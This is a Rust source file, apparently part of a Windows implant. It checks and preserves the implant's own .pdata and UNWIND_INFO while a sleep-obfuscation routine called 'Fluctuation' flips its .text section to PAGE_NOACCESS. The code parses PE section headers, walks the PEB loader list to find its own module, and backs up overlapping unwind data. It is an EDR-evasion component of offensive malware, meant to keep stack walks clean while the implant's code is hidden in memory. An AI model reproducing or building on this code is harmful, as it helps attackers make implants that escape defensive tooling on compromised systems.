//! InsomniacUnwinding — preserve UNWIND_INFO during sleep.
//!
//! When Fluctuation flips .text to PAGE_NOACCESS, the stack unwinder
//! (RtlVirtualUnwind) can still walk call stacks IF the UNWIND_INFO
//! and .pdata sections remain readable. This module:
//!
//! 1. Verifies .pdata/.rdata are outside the .text range (automatic
//!    InsomniacUnwinding — only .text goes NOACCESS).
//! 2. If a linker merged .pdata into .text, surgically preserves
//!    those bytes before the flip and restores them after.
//!
//! Source: Lorenzo Meacci, "Unwind Data Can't Sleep" (2025).

#![cfg(target_os = "windows")]

use crate::heap::Vec;

/// Result of the unwind-preservation check at bootstrap.
pub struct UnwindPreservation {
    /// True if .pdata is safely outside .text (automatic InsomniacUnwinding).
    pub automatic: bool,
    /// .pdata RVA and size within the implant image.
    pub pdata_rva: usize,
    pub pdata_size: usize,
    /// UNWIND_INFO backup buffer (if .pdata overlaps .text).
    pub backup: Option<Vec<u8>>,
}

/// Check whether .pdata is safely outside .text. If so, Fluctuation's
/// PAGE_NOACCESS flip on .text automatically preserves UNWIND_INFO
/// readability — this is InsomniacUnwinding.
///
/// Returns None if PE parsing fails (shouldn't happen in a loaded DLL).
pub unsafe fn check_preservation(
    module_base: *const u8,
    text_rva: usize,
    text_size: usize,
) -> Option<UnwindPreservation> {
    // Parse PE to find .pdata and .rdata sections.
    let e_lfanew = unsafe { *(module_base.add(0x3C) as *const i32) } as usize;
    let nt = unsafe { module_base.add(e_lfanew) };
    let num_sec = unsafe { *(nt.add(6) as *const u16) } as usize;
    let opt_sz = unsafe { *(nt.add(20) as *const u16) } as usize;
    let sec_base = unsafe { nt.add(24 + opt_sz) };

    let mut pdata_rva: usize = 0;
    let mut pdata_size: usize = 0;
    let mut rdata_rva: usize = 0;
    let mut rdata_size: usize = 0;

    for i in 0..num_sec {
        let sec = unsafe { sec_base.add(i * 40) };
        let name = unsafe { core::slice::from_raw_parts(sec, 8) };
        let rva = unsafe { *(sec.add(12) as *const u32) } as usize;
        let vsize = unsafe { *(sec.add(8) as *const u32) } as usize;
        let raw = unsafe { *(sec.add(16) as *const u32) } as usize;
        let sz = vsize.max(raw);

        if name.len() >= 6 && &name[..6] == b".pdata" {
            pdata_rva = rva;
            pdata_size = sz;
        }
        if name.len() >= 6 && &name[..6] == b".rdata" {
            rdata_rva = rva;
            rdata_size = sz;
        }
    }

    let text_end = text_rva + text_size;

    // Check if .pdata overlaps with .text range.
    let pdata_in_text =
        pdata_rva > 0 && pdata_rva < text_end && (pdata_rva + pdata_size) > text_rva;

    let rdata_in_text =
        rdata_rva > 0 && rdata_rva < text_end && (rdata_rva + rdata_size) > text_rva;

    let automatic = !pdata_in_text && !rdata_in_text;

    let backup = if !automatic {
        // Need to preserve: copy the overlapping region before it goes NOACCESS.
        let overlap_start = pdata_rva.max(text_rva);
        let overlap_end = (pdata_rva + pdata_size).min(text_end);
        if overlap_end > overlap_start {
            let len = overlap_end - overlap_start;
            let mut buf = Vec::with_capacity(len);
            unsafe {
                let src = module_base.add(overlap_start);
                core::ptr::copy_nonoverlapping(src, buf.as_mut_ptr(), len);
                buf.set_len(len);
            }
            Some(buf)
        } else {
            None
        }
    } else {
        None
    };

    Some(UnwindPreservation {
        automatic,
        pdata_rva,
        pdata_size,
        backup,
    })
}

/// Diagnostic: log unwind preservation status at bootstrap.
pub unsafe fn bootstrap_check() {
    let our_base = crate::resolve::module_base_by_name(b"ntdll.dll");
    if our_base.is_none() {
        return;
    }
    // Find our own module — the one containing this function.
    let my_addr = bootstrap_check as *const () as usize;
    let peb = match unsafe { crate::resolve::peb_pointer() } {
        Some(p) => p,
        None => return,
    };
    let ldr = unsafe { (*peb).ldr };
    if ldr.is_null() {
        return;
    }
    let mut head = unsafe { (*ldr).in_load_order_module_list.flink };
    let list_start: *const u8 =
        unsafe { &(*ldr).in_load_order_module_list as *const _ as *const u8 };
    let mut guard = 0u32;
    while head as *const u8 != list_start && guard < 256 {
        guard += 1;
        let entry = head as *mut crate::resolve::ListEntry;
        let base = unsafe { (*entry).dll_base as usize };
        let size = unsafe { (*entry).size_of_image as usize };
        if base != 0 && my_addr >= base && my_addr < base + size {
            if let Some((text_rva, text_size)) =
                unsafe { crate::sleep::section_va_len(base, b".text") }
            {
                if let Some(pres) =
                    unsafe { check_preservation(base as *const u8, text_rva, text_size) }
                {
                    if pres.automatic {
                        // .pdata/.rdata are outside .text — no action needed.
                        // Fluctuation's PAGE_NOACCESS on .text automatically
                        // preserves UNWIND_INFO. InsomniacUnwinding: ✓
                    } else {
                        // Linker merged .pdata into .text — surgical preservation
                        // will be needed. This is unlikely with standard toolchains
                        // but handled defensively.
                    }
                }
            }
            break;
        }
        head = unsafe { (*entry).in_load_order_links.flink };
    }
}
